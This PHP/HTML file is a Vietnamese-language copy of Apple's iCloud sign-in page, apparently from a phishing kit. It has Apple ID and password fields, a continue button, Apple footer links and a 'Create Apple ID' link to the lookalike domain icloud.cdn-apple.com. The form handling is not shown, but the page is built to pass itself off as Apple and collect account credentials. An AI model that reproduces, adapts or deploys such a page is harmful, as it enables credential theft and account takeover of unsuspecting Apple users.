<!DOCTYPE html>
<!-- saved from url=(0023)https://www.icloud.com/ -->
<html style="display: block;" lang="vi-vi">

<?php include "inc/header.php" ?>

<body class="sc-theme sc-focus box-shadow border-rad chrome windows webkit vi-vi" style="overflow: hidden;">
    <div id="sr-alert" role="alert" aria-labelledby="sr-alert-title" aria-describedby="sr-alert-description"></div>
    <div id="sc1193" class="atv4 sc-view sc-pane sc-main overflow-visible" style="left: 0px; right: 0px; top: 0px; bottom: 0px; min-width: 950px; min-height: 700px; z-index: 2; ">
        <div id="sc1194" class="atv4 sc-view" style="left: 0px; right: 0px; top: 0px; height: 0px; z-index: 101; "></div>
        <div id="sc1197" class="atv4 sc-view apps-container-view overflow-visible" style="left: -10000px; top: -10000px; z-index: 100; width: 1745px; height: 849px;"></div>

        <!-- Background -->
        <?php include "inc/background.php" ?>
        <!-- End background -->

        <div class="cw-drop-target-container"><input class="cw-drop-target-file" type="file" multiple="multiple"></div>
        <div id="sc1692" class="atv4 sc-view springboard-view" style="left: 0px; width: 1745px; top: 0px; height: 805px; min-width: 950px; min-height: 700px; z-index: 50; opacity: 1; transform: translateX(0px) translateY(0px) translateZ(0px);" aria-hidden="true">
            <div aria-disabled="true" id="sc1732" class="atv4 sc-view icloud-text-view disabled" style="left: 13px; width: 58px; top: 0px; height: 44px;"><span class="icloud-text"></span></div>
        </div>
    </div>
    <div id="sc1780" class="atv4 sc-view sc-pane login-pane" style="left: 0px; right: 0px; top: 0px; bottom: 0px; min-height: 700px; z-index: 5; opacity: 1;">
        <div id="sc1786" class="atv4 sc-view apple-auth-frame" style="margin-top: -310px; margin-left: -320px; left: 50%; width: 640px; top: 50%; height: 480px; z-index: 5;">
            <div class="tk-body sf-ns-ui">
                <div class="si-body si-container container-fluid" id="content" data-theme="lite">
                    <apple-auth app-loading-defaults="{appLoadingDefaults}">
                        <div class="widget-container fade-in  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
                            <div id="step" class="si-step ">
                                <logo>
                                    <div class="logo signin-label  fade-in">
                                        <img class="cnsmr-app-image" src="images/download24.png" alt="Logo của ứng dụng" style="width: 100px;">
                                    </div>
                                </logo>
                                <div id="stepEl">
                                    <sign-in>
                                        <div class="signin fade-in" id="signin">
                                            <h1 tabindex="-1" class="si-container-title tk-intro "> Đăng nhập iCloud</h1>
                                            <div class="container si-field-container  password-second-step">
                                                <div id="sign_in_form" class="signin-form fed-auth hide-password">
                                                    <div class="si-field-container container">
                                                        <div class="form-table">
                                                            <div class="ax-vo-border"></div>
                                                            <div class="account-name form-row    ">
                                                                <label class="sr-only form-cell form-label" for="account_name_text_field">Đăng nhập iCloud ID Apple</label>
                                                                <div class="form-cell">
                                                                    <div class="form-cell-wrapper">
                                                                        <input type="text" class="form-textbox form-textbox-text" id="account_name_text_field" autocomplete="off" autocorrect="off" required="required" placeholder="ID&nbsp;Apple" autofocus="">
                                                                        <span id="apple_id_field_label" aria-hidden="true" class=" form-label-flyout">ID Apple</span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="field-separator"></div>
                                                            <div class="password form-row" aria-hidden="true">
                                                                <label class="sr-only form-cell form-label" for="password_text_field">Mật khẩu</label>
                                                                <div class="form-cell">
                                                                    <div class="form-cell-wrapper">
                                                                        <input type="password" class="form-textbox form-textbox-text" id="password_text_field" required="required" autocomplete="off" placeholder="Mật khẩu" tabindex="-1" value="">
                                                                        <span id="password_field_label" aria-hidden="true" class=" form-label-flyout"> Mật khẩu
                                                                        </span>
                                                                        <span class="sr-only form-label-flyout" id="invalid_user_name_pwd_err_msg" aria-hidden="true"></span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="si-remember-password">
                                                    <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox">
                                                    <label id="remember-me-label" class="form-label" for="remember-me">
                                                        <span class="form-choice-indicator"></span> Duy trì đăng nhập
                                                    </label>
                                                </div>
                                                <div class="spinner-container auth hide " id="nd-spinner-container">
                                                    <img src="images/loading.gif" style="width: 185px">
                                                </div>
                                                <button id="sign-in" tabindex="0" class="si-button btn fed-ui fed-ui-animation-show      remember-me link " aria-label="Tiếp Tục" aria-disabled="false">
                                                    <i class="icon icon_sign_in"></i>
                                                    <span class="text feat-split">Tiếp Tục</span>
                                                </button>
                                                <button id="sign-in-cancel" aria-label="Đóng" aria-disabled="false" tabindex="0" class="si-button btn secondary feat-split  remember-me   link ">
                                                    <span class="text">Đóng</span>
                                                </button>
                                            </div>
                                            <div class="si-container-footer">
                                                <div class="separator "></div>
                                                <div class="links tk-subbody">
                                                    <div class="si-forgot-password">
                                                        <a id="iforgot-link" class="si-link ax-outline lite-theme-override" href="https://iforgot.apple.com/password/verify/appleid" target="_blank">
                                                            Bạn đã quên ID&nbsp;Apple hoặc mật khẩu?
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </sign-in>
                                </div>
                            </div>
                        </div>
                    </apple-auth>
                </div>
            </div>
        </div>
        <div id="sc1782" class="atv4 sc-view sc-container-view" style="left: 0px; right: 0px; top: 0px; bottom: 0px; ">
            <div id="sc2515" class="atv4 sc-view" style="left: 0px; right: 0px; top: 0px; bottom: 0px; ">
                <div id="sc2516" class="atv4 sc-view cloudos-mini-links cancel-link sc-hidden" style="left: 50%; width: 0px; top: 634.5px; height: 25px; z-index: 5;">
                    <div><a aria-hidden="true" target="blank">&lt; Trở lại</a></div>
                </div>
                <div id="sc2527" class="atv4 sc-view auth-footer" style="left: 0px; right: 0px; bottom: 0px; height: 87px;">
                    <div class="footer-contents"><a tabindex="0" class="logo" href="https://www.apple.com/vn" target="blank" title="Apple.com"></a>
                        <div class="links">
                            <div class="line"><a href="https://icloud.cdn-apple.com/" target="null" name="CreateAppleId">Tạo&nbsp;ID&nbsp;Apple</a>&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer-link-separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.apple.com/support/systemstatus/" target="_blank" name="SystemStatus">Tình&nbsp;Trạng&nbsp;Hệ&nbsp;Thống</a>&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer-link-separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.apple.com/vn/privacy/" target="_blank" name="Privacy">Chính&nbsp;Sách&nbsp;Quyền&nbsp;Riêng&nbsp;Tư</a>&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer-link-separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.apple.com/legal/icloud/ww/" target="_blank" name="TOS">Các&nbsp;Điều&nbsp;Khoản&nbsp;&amp;&nbsp;Điều&nbsp;Kiện</a>&nbsp;&nbsp;&nbsp;&nbsp;<span class="footer-link-separator"></span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="copyright">Copyright © 2019 Apple Inc. Giữ toàn quyền.</span></div>
                        </div>
                    </div>
                </div>
                <div id="sc2535" class="atv4 icloud-controls sc-view account-menu cos-account-menu cos-setup-instructions" style="right: 2px; width: 244.256px; top: 0px; height: 44px; z-index: 2;">
                    <div role="button" tabindex="0" id="sc2539" class="atv4 icloud-controls sc-view sc-button-view account-menu borderless button sc-huge-size" style="right: 38px; top: -6px; bottom: 0px; width: 205.256px;"><label id="sc2607-label" class="sc-button-label sc-huge-size ellipsis">Hướng Dẫn Cài Đặt</label></div>
                    <div id="sc2541" class="atv4 icloud-controls sc-view account-menu-divider" style="margin-top: -11px; right: 44px; width: 1px; top: 50%; height: 22px; "></div>
                    <div role="button" tabindex="0" title="Giúp Đỡ và Hỗ Trợ" alt="Giúp Đỡ và Hỗ Trợ" aria-hidden="false" id="sc2544" class="atv4 icloud-controls sc-view sc-button-view sc-image-button-view image-button sc-regular-size no-min-width" style="right: 0px; width: 44px; top: 0px; bottom: 0px; ">
                        <div class="img help-icon"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>